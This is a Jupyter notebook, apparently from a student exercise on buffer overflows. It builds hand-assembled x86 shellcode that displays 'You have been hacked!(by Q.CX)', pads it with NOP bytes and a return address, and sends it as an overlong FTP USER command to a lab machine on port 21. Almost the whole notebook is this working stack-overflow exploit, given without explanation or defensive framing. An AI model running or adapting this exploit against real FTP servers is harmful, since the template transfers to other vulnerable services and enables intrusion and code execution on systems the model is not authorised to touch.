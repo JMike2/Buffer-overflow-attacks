{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys,socket"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "shellcode = b\"\\x33\\xDB\" +\\\n",
    "            b\"\\x53\"+\\\n",
    "            b\"\\x68\\x69\\x6E\\x67\\x20\"+\\\n",
    "            b\"\\x68\\x57\\x61\\x72\\x6E\"+\\\n",
    "            b\"\\x8B\\xC4\"+\\\n",
    "            b\"\\x53\" +\\\n",
    "            b\"\\x68\\x58\\x29\\x20\\x20\"+\\\n",
    "            b\"\\x68\\x20\\x51\\x2E\\x43\"+\\\n",
    "            b\"\\x68\\x21\\x28\\x62\\x79\"+\\\n",
    "            b\"\\x68\\x63\\x6B\\x65\\x64\"+\\\n",
    "            b\"\\x68\\x6E\\x20\\x68\\x61\"+\\\n",
    "            b\"\\x68\\x20\\x62\\x65\\x65\"+\\\n",
    "            b\"\\x68\\x68\\x61\\x76\\x65\"+\\\n",
    "            b\"\\x68\\x59\\x6F\\x75\\x20\"+\\\n",
    "            b\"\\x8B\\xCC\"+\\\n",
    "            b\"\\x53\"+\\\n",
    "            b\"\\x50\"+\\\n",
    "            b\"\\x51\"+\\\n",
    "            b\"\\x53\"+\\\n",
    "            b\"\\xB8\\x0b\\x05\\xd5\\x77\"+\\\n",
    "            b\"\\xFF\\xD0\"       \n",
    "\n",
    "# RET地址\n",
    "RET_addr = bytes.fromhex(\"7ffa4512\")[::-1]\n",
    "attackcode = ((b\"\\x90\" * 485 + RET_addr).ljust(493, b\"\\x90\") + shellcode).ljust(1000, b\"\\x90\")\n",
    "\n",
    "# 设置目标主机地址，端口号\n",
    "host = '192.168.208.128'\n",
    "port = 21\n",
    "with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:\n",
    "    sock.connect((host, port))\n",
    "    data = b'user ' + attackcode + b'\\r\\n'\n",
    "    pawd = b\"PASS 123\\r\\n\"\n",
    "    sock.send(data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'20202958432e51207962282164656b636168206e656562206576616820756f59'"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "str =b\"You have been hacked!(by Q.CX)  \"[::-1]\n",
    "str.hex()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.16"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
